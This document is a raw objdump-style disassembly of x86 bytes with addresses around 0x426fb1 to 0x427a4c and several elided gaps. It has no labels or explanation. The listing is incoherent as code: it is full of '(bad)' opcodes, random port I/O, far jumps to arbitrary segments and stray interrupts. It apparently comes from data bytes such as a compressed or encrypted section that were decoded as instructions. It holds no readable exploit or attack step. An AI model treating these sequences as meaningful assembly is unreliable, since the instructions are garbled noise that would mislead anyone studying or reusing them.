  426fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fb2:	mov    eax,0x879fd5a1
  426fb7:	sub    DWORD PTR [ecx+edx*1-0x4b],ebp
  426fbb:	adc    edi,esp
  426fbd:	push   ds
  426fbe:	mov    edx,0xb65abb2c
  426fc3:	add    BYTE PTR [ecx+0x40cace4f],ch
  426fc9:	push   ss
  426fca:	repnz sbb dl,BYTE PTR ds:0x477dacba
  426fd1:	mov    BYTE PTR [edi-0x3c],dh
  426fd4:	std    
  426fd5:	in     eax,dx
  426fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426fd7:	aad    0x67
  426fd9:	dec    ecx
  426fda:	push   eax
  426fdb:	shr    eax,cl
  426fdd:	js     0x426fbd
  426fdf:	in     eax,0xcb
  426fe1:	lahf   
  426fe2:	xchg   edi,eax
  426fe3:	sbb    al,0xf3
  426fe5:	mov    ebx,0xd50a0ea4
  426fea:	int    0x81
  426fec:	adc    eax,0xf4061a31
  426ff1:	cmc    
  426ff2:	scas   al,BYTE PTR es:[edi]
  426ff3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ff4:	fistp  WORD PTR [ecx]
  426ff6:	inc    eax
  426ff7:	stos   DWORD PTR es:[edi],eax
  426ff8:	mov    DWORD PTR [edi],ebp
  426ffa:	pop    esi
  426ffb:	mov    ecx,0x5855d247
  427000:	std    
  427001:	fs inc dx
  427004:	sub    DWORD PTR [ecx-0x27912d49],ecx
  42700a:	sbb    al,0x33
  42700c:	pop    esi
  42700d:	sbb    al,0xe2
  42700f:	je     0x427074
  427011:	ins    BYTE PTR es:[edi],dx
  427012:	imul   edx,edx,0x38b5364f
  427018:	dec    ecx
  427019:	cwde   
  42701a:	retf   0x7fd8
  42701d:	ret    0x891e
  427020:	aad    0xb8
  427022:	sub    al,0xeb
  427024:	adc    ch,dh
  427026:	stos   BYTE PTR es:[edi],al
  427027:	adc    edx,eax
  427029:	sub    BYTE PTR [edx],bl
  42702b:	aam    0x77
  42702d:	in     al,dx
  42702e:	shl    BYTE PTR [eax],1
  427030:	(bad)  
  427031:	jae    0x427078
  427033:	mov    esi,0xeab6d2d7
  427038:	popa   
  427039:	scas   eax,DWORD PTR es:[edi]
  42703a:	scas   al,BYTE PTR es:[edi]
  42703b:	sbb    cl,ch
  42703d:	(bad)  
  42703e:	out    dx,eax
  42703f:	das    
  427040:	mov    cl,BYTE PTR [ecx-0x36460e08]
  427046:	pop    ds
  427047:	or     ch,BYTE PTR [ebx+0x4ca72110]
  42704d:	jl     0x426fd6
  42704f:	mov    esp,0xa589b4b5
  427054:	jne    0x427004
  427056:	(bad)  
  427057:	in     al,dx
  427058:	adc    ecx,DWORD PTR [edi+0x2f]
  42705b:	jno    0x427042
  42705d:	xchg   ebx,eax
  42705e:	push   ebp
  42705f:	lahf   
  427060:	fsubp  st(2),st
  427062:	icebp  
  427063:	inc    edx
  427064:	fmul   DWORD PTR [eax]
  427066:	cmp    eax,0xe6d5c2c9
  42706b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42706c:	dec    edx
  42706d:	or     DWORD PTR [eax+ebx*8-0x16],eax
  427071:	inc    esp
  427072:	push   ds
  427073:	add    al,0x24
  427075:	ja     0x426ff8
  427077:	push   esi
  427078:	or     ecx,DWORD PTR [ebp+0x2955e00a]
  42707e:	jmp    0x7a31:0xac9e273b
  427085:	mov    WORD PTR [eax+0x4b394429],cs
  42708b:	xchg   esi,eax
  42708c:	aaa    
  42708d:	push   esp
  42708e:	ficom  DWORD PTR [edx]
	...
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x85c79d96
  427102:	jae    0x427106
  427104:	or     al,0xa1
  427106:	add    DWORD PTR [eax],eax
  427108:	add    al,0x1
  42710a:	add    BYTE PTR [eax],al
  42710c:	(bad)  
  42710d:	mov    ds,ebp
  42710f:	je     0x42712c
  427111:	inc    edi
  427112:	pop    es
  427113:	jnp    0x4270b1
  427115:	jns    0x427125
  427117:	in     al,dx
  427118:	retf   
  427119:	mov    ch,BYTE PTR [ebx]
  42711b:	inc    ecx
  42711c:	aaa    
  42711d:	(bad)  
  42711e:	lar    ebp,WORD PTR [eax]
  427121:	and    BYTE PTR [edi],0xa0
  427124:	gs loopne 0x4270ef
  427127:	pop    edx
  427128:	and    ecx,DWORD PTR [ecx+0x1a9bba64]
  42712e:	cmp    edx,DWORD PTR ds:0x5003c337
  427134:	push   edx
  427135:	jnp    0x427105
  427137:	test   al,0x55
  427139:	cmp    bh,ah
  42713b:	(bad)  
  42713c:	xlat   BYTE PTR ds:[ebx]
  42713d:	cmp    esp,DWORD PTR [edi-0x238e5d9a]
  427143:	idiv   BYTE PTR [esi+0x7ba846c6]
  427149:	es sub al,bh
  42714c:	stos   BYTE PTR es:[edi],al
  42714d:	out    dx,eax
  42714e:	jne    0x427138
  427150:	(bad)  
  427153:	xchg   edx,eax
  427154:	push   esi
  427155:	or     eax,0x32b53d76
  42715a:	sti    
  42715b:	or     ebp,ebp
  42715d:	loope  0x427197
  42715f:	add    al,0x3e
  427161:	int    0x71
  427163:	xchg   esp,eax
  427164:	mov    ds:0xd555824a,eax
  427169:	mov    edi,0xa76f0f3
  42716e:	and    al,0xd6
  427170:	arpl   WORD PTR [edx-0x3f2577fc],cx
  427176:	aaa    
  427177:	sbb    DWORD PTR [edi-0x4d38c405],esi
  42717d:	addr16 jbe 0x4271a1
  427180:	cdq    
  427181:	ficomp WORD PTR [ebx-0x48]
  427184:	arpl   WORD PTR [edx+0x5a],bx
  427187:	sbb    dh,BYTE PTR [ebx+0x60ced26b]
  42718d:	inc    ecx
  42718e:	pop    ecx
  42718f:	pusha  
  427190:	push   esi
  427191:	jecxz  0x42714d
  427193:	push   es
  427194:	aaa    
  427195:	mov    bh,0x68
  427197:	pop    edi
  427198:	or     edx,DWORD PTR [ecx+0x50]
  42719b:	pusha  
  42719c:	rcl    DWORD PTR [edx+0x28],1
  42719f:	shl    esi,cl
  4271a1:	push   edi
  4271a2:	lods   eax,DWORD PTR ds:[esi]
  4271a3:	jle    0x42720d
  4271a5:	push   edx
  4271a6:	call   0xee9f2606
  4271ab:	mov    eax,0xc97854e5
  4271b0:	(bad)  
  4271b1:	cmp    al,0x44
  4271b3:	mov    dl,0x64
  4271b5:	sbb    BYTE PTR [edx+edi*4+0x2f18f1c],cl
  4271bc:	cmp    DWORD PTR [eax+0x3d55e595],edx
  4271c2:	call   0xee0bbad3
  4271c7:	aam    0xad
  4271c9:	pop    ss
  4271ca:	stos   DWORD PTR es:[edi],eax
  4271cb:	retf   0xa6ca
  4271ce:	xchg   ecx,eax
  4271cf:	cmp    DWORD PTR [edx-0x1980c3f0],0x64e8a619
  4271d9:	stc    
  4271da:	data16 ja 0x427206
  4271dd:	out    0x5f,eax
  4271df:	sub    eax,0xb50e5c08
  4271e4:	xchg   esi,eax
  4271e5:	mov    esp,0xb9797eb7
  4271ea:	mov    ds:0xf2c80f16,eax
  4271ef:	mov    eax,0xd7f84f52
  4271f4:	mov    ebp,0x36abbca3
  4271f9:	sahf   
  4271fa:	push   esi
  4271fb:	mov    ah,BYTE PTR [edx+0xb]
  4271fe:	sbb    esp,DWORD PTR [ebx-0x28]
  427201:	mov    esp,0x66900ffe
  427206:	daa    
  427207:	cmc    
  427208:	nop
  427209:	push   edi
  42720a:	fwait
  42720b:	mov    bh,0xef
  42720d:	and    al,0x70
  42720f:	push   0x0
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x3fd916e5,al
  427284:	adc    BYTE PTR [edx+0x1040001],ah
  42728a:	add    BYTE PTR [eax],al
  42728c:	jbe    0x427296
  42728e:	js     0x427229
  427290:	or     DWORD PTR [edi],ecx
  427292:	sar    DWORD PTR [ecx],cl
  427294:	jecxz  0x427240
  427296:	pop    esi
  427297:	cmp    eax,ebx
  427299:	sbb    DWORD PTR [edi+0x73],eax
  42729c:	rcl    DWORD PTR [ebx+0x9],0x5a
  4272a0:	xor    DWORD PTR [edi],ecx
  4272a2:	inc    esi
  4272a3:	xlat   BYTE PTR ds:[ebx]
  4272a4:	sub    al,0xf3
  4272a6:	(bad)  
  4272a7:	push   ds
  4272a8:	push   ds
  4272a9:	add    al,0x8
  4272ab:	sub    al,BYTE PTR ds:0x55100396
  4272b1:	test   DWORD PTR [eax+0x69885011],eax
  4272b7:	adc    DWORD PTR gs:0xc329d413,ecx
  4272be:	cld    
  4272bf:	jne    0x4272f7
  4272c1:	out    dx,al
  4272c2:	aam    0x6b
  4272c4:	jae    0x4272d6
  4272c6:	dec    ebx
  4272c7:	sbb    DWORD PTR [edx-0x37a1f908],edi
  4272cd:	xor    eax,0xf340404e
  4272d2:	jmp    0x8df9:0xccec5a37
  4272d9:	(bad)  
  4272da:	mov    bh,0xc7
  4272dc:	add    al,0x7d
  4272de:	mov    al,ds:0xf67fbfa5
  4272e3:	retf   0xd5c4
  4272e6:	push   esp
  4272e7:	popa   
  4272e8:	in     eax,0xb3
  4272ea:	div    DWORD PTR [eax+0x44a23f5e]
  4272f0:	mov    DWORD PTR [ebp-0x29],edi
  4272f3:	mov    dl,BYTE PTR [edi-0x6193da4f]
  4272f9:	mov    bh,0x1
  4272fb:	mov    ds:0xf17d9e18,al
  427300:	push   ecx
  427301:	cmp    dl,bl
  427303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427304:	pop    edx
  427305:	xchg   ch,bh
  427307:	cli    
  427308:	shl    DWORD PTR [esp+edi*4+0x1650e2b4],cl
  42730f:	push   0xffffffcc
  427311:	mov    esp,0xfad015e
  427316:	nop
  427317:	push   eax
  427318:	inc    eax
  427319:	jmp    0x8578:0xdcf46611
  427320:	nop
  427321:	mov    edi,esi
  427323:	sub    BYTE PTR [ebx-0x3db709bc],dl
  427329:	mov    ah,0x2a
  42732b:	mov    ch,0x21
  42732d:	pop    es
  42732e:	mov    ebp,0xc4070640
  427333:	jp     0x4273b1
  427335:	test   al,0xfd
  427337:	fmul   QWORD PTR [eax-0x68b4cb7b]
  42733d:	add    esi,DWORD PTR [ecx]
  42733f:	stos   BYTE PTR es:[edi],al
  427340:	xchg   ebp,esi
  427342:	mov    dh,0x28
  427344:	imul   edx,eax,0xffffffe2
  427347:	sbb    eax,0x7db4ca0c
  42734c:	inc    ecx
  42734d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42734e:	and    BYTE PTR [eax+ebx*8],0xaf
  427352:	cmp    ecx,esi
  427354:	stc    
  427355:	cmp    ecx,DWORD PTR [ecx]
  427357:	cmp    ecx,DWORD PTR [eax+0x4dd3d611]
  42735d:	mov    bh,0xaf
  42735f:	add    eax,0x5c244df2
  427364:	or     ah,BYTE PTR [esi+0x2d169736]
  42736a:	out    0xf4,al
  42736c:	xchg   esi,eax
  42736d:	push   esi
  42736e:	or     DWORD PTR es:[eax+0x4],esp
  427372:	adc    DWORD PTR [edi+0x72],0x4cae8371
  427379:	in     eax,dx
  42737a:	jne    0x427368
  42737c:	or     edx,DWORD PTR ds:0x70627439
  427382:	(bad)  
  427383:	in     al,0x51
  427385:	or     dl,ah
  427387:	or     al,0xfe
  427389:	dec    edi
  42738a:	lods   al,BYTE PTR ds:[esi]
  42738b:	adc    eax,0x73c17cd9
	...
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    edi,DWORD PTR [eax-0x7]
  427402:	arpl   WORD PTR [eax+0x14],bp
  427405:	mov    ds:0x1040001,eax
  42740a:	add    BYTE PTR [eax],al
  42740c:	lahf   
  42740d:	and    eax,0x92f9dc87
  427412:	inc    edx
  427413:	push   esi
  427414:	jg     0x427447
  427416:	adc    ah,dl
  427418:	cmp    bl,dh
  42741a:	push   0x2eece9ce
  42741f:	xlat   BYTE PTR ds:[ebx]
  427420:	(bad)  
  427421:	fwait
  427422:	xor    cl,ah
  427424:	dec    ebx
  427425:	outs   dx,DWORD PTR ds:[esi]
  427426:	ja     0x4273a8
  427428:	mov    ecx,0x3b795cb9
  42742d:	aaa    
  42742e:	fwait
  42742f:	cdq    
  427430:	and    eax,0xa24f26b3
  427435:	jmp    0x71a2:0xd0c002dc
  42743c:	jp     0x42749e
  42743e:	mov    DWORD PTR [esi],ecx
  427440:	mov    eax,ds:0x77f6f665
  427445:	sbb    edi,esi
  427447:	loop   0x42744a
  427449:	call   0x34f77dfc
  42744e:	push   eax
  42744f:	jno    0x42749f
  427451:	in     al,dx
  427452:	sahf   
  427453:	retf   
  427454:	fcom   DWORD PTR [ecx-0x15943f77]
  42745a:	outs   dx,DWORD PTR ds:[esi]
  42745b:	dec    edx
  42745c:	ficom  DWORD PTR [ecx+ebx*8+0x1ccebc6b]
  427463:	jge    0x42740b
  427465:	nop
  427466:	icebp  
  427467:	sbb    al,0xea
  427469:	ds (bad) 
  42746b:	xlat   BYTE PTR ds:[ebx]
  42746c:	or     DWORD PTR [edx],0x79
  42746f:	(bad)  
  427471:	pop    ss
  427472:	daa    
  427473:	fwait
  427474:	add    BYTE PTR [ecx],dh
  427476:	sub    al,0x1f
  427478:	push   eax
  427479:	mov    DWORD PTR [eax-0x73c5b297],esp
  42747f:	sbb    BYTE PTR [edx-0x622227c3],ch
  427485:	adc    dh,dh
  427487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427488:	push   es
  427489:	inc    ecx
  42748a:	mov    dh,0x65
  42748c:	fistp  QWORD PTR ds:0xde169a5d
  427492:	inc    DWORD PTR [esi]
  427494:	fnstcw WORD PTR [ebx-0x28]
  427497:	adc    BYTE PTR [edx],ah
  427499:	xchg   esi,eax
  42749a:	jle    0x427494
  42749c:	mov    al,0x17
  42749e:	sbb    al,ch
  4274a0:	sub    eax,0xac4b987d
  4274a5:	pop    edi
  4274a6:	and    ecx,esp
  4274a8:	push   es
  4274a9:	mov    ecx,0x2044989e
  4274ae:	adc    al,0x21
  4274b0:	jge    0x4274ea
  4274b2:	aaa    
  4274b3:	sub    DWORD PTR [ecx+eiz*8],eax
  4274b6:	jmp    0x927aebe8
  4274bb:	sub    eax,0xbdce2947
  4274c0:	mov    al,ds:0x50e1edeb
  4274c5:	or     BYTE PTR ds:0x4dad0049,bh
  4274cb:	or     ch,BYTE PTR [esi-0x3]
  4274ce:	js     0x427522
  4274d0:	mov    ds:0x909afa1e,al
  4274d5:	aaa    
  4274d6:	and    ebx,DWORD PTR [edx]
  4274d8:	(bad)  
  4274d9:	leave  
  4274da:	stos   DWORD PTR es:[edi],eax
  4274db:	ss xchg esp,eax
  4274dd:	aam    0x62
  4274df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274e0:	push   esi
  4274e1:	stos   BYTE PTR es:[edi],al
  4274e2:	loopne 0x427507
  4274e4:	cmp    eax,0xb701b330
  4274e9:	adc    DWORD PTR ds:0x3eae92b2,ebp
  4274ef:	mov    ebp,0xa65789b4
  4274f4:	(bad)  
  4274f5:	shr    DWORD PTR [ecx],cl
  4274f7:	push   cs
  4274f8:	iret   
  4274f9:	ja     0x4274cb
  4274fb:	inc    ebx
  4274fc:	or     bh,BYTE PTR [ebx+0x21]
  4274ff:	mov    DWORD PTR [edi-0x2a],esi
  427502:	call   DWORD PTR [eax-0x2a]
  427505:	cli    
  427506:	fsubr  QWORD PTR [esi+0xc7dab8a]
  42750c:	xor    edx,DWORD PTR [edx+0xe69a]
	...
  427572:	add    BYTE PTR [eax],al
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	ds (bad) 
  427582:	gs jge 0x42759d
  427585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427586:	add    DWORD PTR [eax],eax
  427588:	add    al,0x1
  42758a:	add    BYTE PTR [eax],al
  42758c:	sbb    eax,0x717534ac
  427591:	or     DWORD PTR [eax],edx
  427593:	push   edi
  427594:	push   cs
  427595:	ror    DWORD PTR [ecx+0x6b],0x73
  427599:	fstp   QWORD PTR [ebx+esi*8+0x7cf0ed89]
  4275a0:	cwde   
  4275a1:	and    eax,0xbe2582f2
  4275a6:	and    ch,BYTE PTR [ebx+esi*1-0x65f7ac29]
  4275ad:	mov    al,ds:0x1a754d06
  4275b2:	xchg   esi,eax
  4275b3:	(bad)  
  4275b4:	ss out 0x18,al
  4275b7:	sbb    BYTE PTR [edi-0x66d8b689],ah
  4275bd:	push   DWORD PTR [edi+eax*1]
  4275c0:	icebp  
  4275c1:	and    cl,BYTE PTR [esp+edx*1]
  4275c4:	(bad)  
  4275c6:	jb     0x4275c1
  4275c8:	mov    bl,BYTE PTR [edi+edi*1]
  4275cb:	imul   esi,edx,0xeb20a822
  4275d1:	popf   
  4275d2:	add    BYTE PTR ds:0x4c99964a,dl
  4275d8:	test   BYTE PTR [edx-0x3],0xb
  4275dc:	dec    ebp
  4275dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275de:	outs   dx,BYTE PTR ds:[esi]
  4275df:	mov    ds:0x819f5aab,eax
  4275e5:	iret   
  4275e6:	jno    0x427597
  4275e8:	adc    eax,0x9abd2e16
  4275ed:	rcl    BYTE PTR [ebx],1
  4275ef:	adc    al,bh
  4275f1:	ret    
  4275f2:	mov    bh,0xa6
  4275f4:	retf   0xa59
  4275f7:	cmp    bh,BYTE PTR [esi-0x5bce176b]
  4275fd:	call   0xe47f:0xbf599b16
  427604:	imul   eax,DWORD PTR [edx-0x73],0xffffffd4
  427608:	shl    BYTE PTR [ecx],1
  42760a:	(bad)  
  42760b:	sub    al,0xa9
  42760d:	mov    bl,0xd4
  42760f:	mov    dl,0x1a
  427611:	imul   esi,ebp,0x22
  427614:	cwde   
  427615:	pop    ebp
  427616:	push   0x1ff790e6
  42761b:	xor    eax,0xd80786f7
  427620:	fcmove st,st(3)
  427622:	dec    esi
  427623:	or     al,0x76
  427625:	mov    edi,0x7a47365c
  42762a:	outs   dx,DWORD PTR ds:[esi]
  42762b:	sub    al,0x34
  42762d:	xchg   esi,eax
  42762e:	mov    ?,WORD PTR [edi-0x2ef8c143]
  427634:	cmp    cl,ch
  427636:	jmp    0x42769f
  427638:	in     eax,0xeb
  42763a:	jb     0x42764c
  42763c:	xor    esi,DWORD PTR [eax-0x38]
  42763f:	ret    0xa3bf
  427642:	mov    DWORD PTR [ebx-0x16],ecx
  427645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427646:	mov    ah,0xac
  427648:	lods   al,BYTE PTR ds:[esi]
  427649:	add    eax,0xe5d9e7a9
  42764e:	dec    esp
  42764f:	inc    edi
  427650:	xor    dl,ah
  427652:	dec    ebx
  427653:	mov    bh,0x2
  427655:	xchg   edx,eax
  427656:	or     eax,edi
  427658:	rol    DWORD PTR [edi],0xa3
  42765b:	or     DWORD PTR [edi+0x699586d7],edx
  427661:	test   bh,0x48
  427664:	pushf  
  427665:	in     al,dx
  427666:	mov    ah,0x62
  427668:	dec    ecx
  427669:	and    ch,0x81
  42766c:	leave  
  42766d:	sub    al,0x4a
  42766f:	ret    
  427670:	iret   
  427671:	or     BYTE PTR [ebx+0x3befd929],0x8c
  427678:	dec    edi
  427679:	mov    BYTE PTR [edx],ch
  42767b:	lods   al,BYTE PTR ds:[esi]
  42767c:	add    DWORD PTR [ecx],ecx
  42767e:	mov    ch,0x4a
  427680:	xor    al,0x4a
  427682:	hlt    
  427683:	test   DWORD PTR [edi+eax*8],ecx
  427686:	mov    ch,0x44
  427688:	stos   DWORD PTR es:[edi],eax
  427689:	fmul   DWORD PTR [esi+ecx*8-0x23]
  42768d:	and    al,0x15
  42768f:	fwait
	...
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fldcw  WORD PTR [esi]
  427701:	xlat   BYTE PTR ds:[ebx]
  427702:	xchg   ebx,eax
  427703:	dec    ebp
  427704:	sbb    al,0xa5
  427706:	add    DWORD PTR [eax],eax
  427708:	add    al,0x1
  42770a:	add    BYTE PTR [eax],al
  42770c:	jmp    0x465f:0x3b4ee3e5
  427713:	fwait
  427714:	call   0x60d2:0xf15ec84
  42771b:	imul   edx,ebx,0xffffffed
  42771e:	and    dh,ah
  427720:	mov    ds:0x372b815e,al
  427725:	add    ah,cl
  427727:	sub    edx,ebp
  427729:	or     ebp,edx
  42772b:	sbb    esp,edi
  42772d:	mov    dh,0x4f
  42772f:	rcl    cl,1
  427731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427732:	add    al,0x45
  427734:	mov    eax,0x2ce71528
  427739:	mov    edi,0x315ec45e
  42773e:	or     al,0x3f
  427740:	mov    ecx,esp
  427742:	jecxz  0x42774b
  427744:	pushf  
  427745:	cmp    ch,ah
  427747:	pop    eax
  427748:	jle    0x4277ad
  42774a:	jne    0x427775
  42774c:	pop    ebx
  42774d:	push   0x9bd0abd0
  427752:	adc    al,0xda
  427754:	leave  
  427755:	sbb    al,0xde
  427757:	test   al,0x4d
  427759:	inc    edi
  42775a:	neg    bl
  42775c:	and    DWORD PTR [eax+0x5230495f],edx
  427762:	aam    0x65
  427764:	int3   
  427765:	push   edi
  427766:	nop
  427767:	pop    edi
  427768:	and    BYTE PTR [eax+ebx*1+0x4baf967b],0x37
  427770:	inc    ebp
  427771:	aas    
  427772:	jg     0x427725
  427774:	or     DWORD PTR [ebx+0x76fedb05],ebx
  42777a:	cli    
  42777b:	mov    DWORD PTR [eax-0x74],edi
  42777e:	data16 or al,0xf5
  427781:	stc    
  427782:	xchg   edi,eax
  427783:	cmp    al,0xaf
  427785:	xchg   ebp,eax
  427786:	test   DWORD PTR [eax],ebx
  427788:	repnz mov ecx,0x1878a2ca
  42778e:	dec    ebx
  42778f:	(bad)  
  427790:	std    
  427791:	and    ebp,DWORD PTR [eax+ebx*8]
  427794:	dec    ecx
  427795:	fchs   
  427797:	scas   eax,DWORD PTR es:[edi]
  427798:	sub    dl,BYTE PTR [esi-0x9]
  42779b:	xchg   esp,eax
  42779c:	cwde   
  42779d:	popf   
  42779e:	fnop   
  4277a0:	sub    BYTE PTR [edi],ah
  4277a2:	loopne 0x4277c3
  4277a4:	hlt    
  4277a5:	inc    esp
  4277a6:	sub    bh,bh
  4277a8:	nop
  4277a9:	loop   0x4277a2
  4277ab:	fidiv  WORD PTR [eax+ebx*8]
  4277ae:	aad    0x36
  4277b0:	lods   eax,DWORD PTR ds:[esi]
  4277b1:	sbb    eax,DWORD PTR [ebx+0x65]
  4277b4:	les    ax,DWORD PTR [bp+di+0x28]
  4277b9:	cmp    eax,DWORD PTR [edi+0x48]
  4277bc:	leave  
  4277bd:	imul   eax,DWORD PTR [eax-0x5f],0x6d386815
  4277c4:	aad    0xa9
  4277c6:	iret   
  4277c7:	pop    ebp
  4277c8:	push   esi
  4277c9:	rol    BYTE PTR [ecx-0x621e72fa],cl
  4277cf:	iret   
  4277d0:	mov    ebp,0x6be6f0f9
  4277d5:	outs   dx,BYTE PTR ds:[esi]
  4277d6:	(bad)  
  4277d7:	cmc    
  4277d8:	mov    edx,0xc3615339
  4277dd:	pop    esi
  4277de:	in     al,dx
  4277df:	or     eax,0x180a435
  4277e4:	adc    eax,0xaa754fb2
  4277e9:	mov    edx,0x70102b8b
  4277ee:	pop    es
  4277ef:	or     al,0x28
  4277f1:	cs sbb al,0x40
  4277f4:	jmp    0x47bd:0xc3eeda74
  4277fb:	jns    0x42782f
  4277fd:	enter  0xfa60,0xf8
  427801:	mov    esi,0x881d06b4
  427806:	cmp    eax,0xec1ad1d6
  42780b:	sbb    BYTE PTR [esp+edx*4-0x29],ah
  42780f:	add    BYTE PTR ds:[eax],al
	...
  427872:	add    BYTE PTR [eax],al
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
  42787e:	fldl2e 
  427880:	imul   edx,DWORD PTR [edx-0x31],0x1a6202d
  427887:	add    BYTE PTR [ecx+eax*1],al
  42788a:	add    BYTE PTR [eax],al
  42788c:	outs   dx,BYTE PTR ds:[esi]
  42788d:	mov    al,0x91
  42788f:	add    al,0x54
  427891:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  427893:	and    DWORD PTR [esi-0x11b750e1],esp
  427899:	int    0x92
  42789b:	dec    BYTE PTR [esi]
  42789d:	or     bl,BYTE PTR [ecx]
  42789f:	jmp    0x4278c0
  4278a1:	add    al,0x46
  4278a3:	or     al,0xcf
  4278a5:	pushf  
  4278a6:	xor    DWORD PTR [ebx+0x21bf78b2],edx
  4278ac:	shl    dl,cl
  4278ae:	sbb    ebx,DWORD PTR [ecx+ebp*8+0x6a]
  4278b2:	fild   QWORD PTR [ebp-0x32]
  4278b5:	push   ebx
  4278b6:	mov    dh,0xdd
  4278b8:	out    0xcd,eax
  4278ba:	dec    esi
  4278bb:	test   eax,0xb0fa600c
  4278c0:	jns    0x427908
  4278c2:	aad    0x9
  4278c4:	lock sti 
  4278c6:	mov    bl,BYTE PTR [eax+0x145cd579]
  4278cc:	outs   dx,BYTE PTR ds:[esi]
  4278cd:	int3   
  4278ce:	push   edx
  4278cf:	xchg   edx,eax
  4278d0:	mov    eax,ds:0x8ac68a70
  4278d5:	xchg   edi,eax
  4278d6:	into   
  4278d7:	pop    esi
  4278d8:	in     eax,dx
  4278d9:	mov    bh,BYTE PTR [ebx+0x2f790ce7]
  4278df:	lods   al,BYTE PTR ds:[esi]
  4278e1:	ja     0x4278e4
  4278e3:	xchg   al,ah
  4278e5:	es nop
  4278e7:	mov    eax,ds:0x4472928a
  4278ec:	clc    
  4278ed:	loopne 0x42794a
  4278ef:	add    esi,DWORD PTR [ebx-0x4]
  4278f2:	jl     0x4278bc
  4278f4:	clc    
  4278f5:	and    al,0x93
  4278f7:	je     0x4278d3
  4278f9:	xor    eax,0xaa528879
  4278fe:	imul   esi,DWORD PTR [edx+0x74],0x6
  427902:	sub    BYTE PTR [ebp-0xa0e65a0],cl
  427908:	out    dx,al
  427909:	sahf   
  42790a:	add    BYTE PTR [edx],0xf4
  42790d:	inc    edx
  42790e:	mov    dh,0x42
  427910:	mov    WORD PTR [edi+0x36a48b62],?
  427916:	jb     0x42789a
  427918:	out    0x17,al
  42791a:	ror    esi,cl
  42791c:	cmp    cl,BYTE PTR [esi+esi*4+0x5b]
  427920:	adc    DWORD PTR [ebp-0x9],0xffffff90
  427924:	inc    ebp
  427925:	dec    ebp
  427926:	adc    al,0xbd
  427928:	inc    esp
  427929:	out    0xc2,al
  42792b:	jmp    0x2247:0xd0c4ea99
  427932:	loope  0x42792a
  427934:	jmp    0xef99644d
  427939:	rol    BYTE PTR [eax-0x11524541],cl
  42793f:	mov    ds:0x53b06a4e,eax
  427944:	(bad)  
  427945:	loope  0x427907
  427947:	repz pop ecx
  427949:	les    ebp,FWORD PTR es:[eax-0x7fef27ef]
  427950:	mov    dh,ah
  427952:	jmp    0xdd6b1913
  427957:	inc    ebp
  427958:	mov    ebx,0x93a5ce20
  42795d:	jno    0x42799f
  42795f:	cli    
  427960:	sub    eax,0xf40cd946
  427965:	out    dx,eax
  427966:	addr16 mov bh,0xc5
  427969:	imul   BYTE PTR [ebp-0x2748c5cd]
  42796f:	test   eax,0x7f51e8bb
  427975:	lahf   
  427976:	pop    ebp
  427977:	mov    eax,ds:0x511b16c
  42797c:	xor    ebp,edx
  42797e:	fdivr  QWORD PTR [ebx+ebp*1]
  427981:	adc    al,BYTE PTR [esi+0x25]
  427984:	fs cmp al,0xb4
  427987:	or     al,0x71
  427989:	dec    esp
  42798a:	(bad)  
  42798b:	xor    BYTE PTR [ecx+0x1dc939],ch
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx-0x6fc30662]
  427a04:	and    al,0xa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    al,0x1
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	stc    
  427a0d:	push   esi
  427a0e:	popf   
  427a0f:	sti    
  427a10:	xor    DWORD PTR [ecx],ebx
  427a12:	xchg   ebp,eax
  427a13:	inc    eax
  427a14:	mov    ds:0xf32ac7e,eax
  427a19:	in     eax,dx
  427a1a:	and    ch,0xa1
  427a1d:	daa    
  427a1e:	jnp    0x4279ba
  427a20:	adc    bh,BYTE PTR [ebp-0x52]
  427a23:	test   dl,ch
  427a25:	and    DWORD PTR [ebp+0x7f],esi
  427a28:	int    0x0
  427a2a:	(bad)  [eax-0x7f8a85b7]
  427a30:	xor    al,0x72
  427a32:	push   eax
  427a33:	test   al,0x2f
  427a35:	fdiv   DWORD PTR [edx]
  427a37:	dec    edx
  427a38:	imul   esi,DWORD PTR [ecx+esi*2],0xe1403efc
  427a3f:	dec    esp
  427a40:	sar    BYTE PTR [edi-0x3d],1
  427a43:	dec    esi
  427a44:	push   ds
  427a45:	push   ecx
  427a46:	ss fwait
  427a48:	cmp    esp,DWORD PTR [eax+0x62]
  427a4b:	dec    ecx
  427a4c:	mov    eax,0x1791fa92
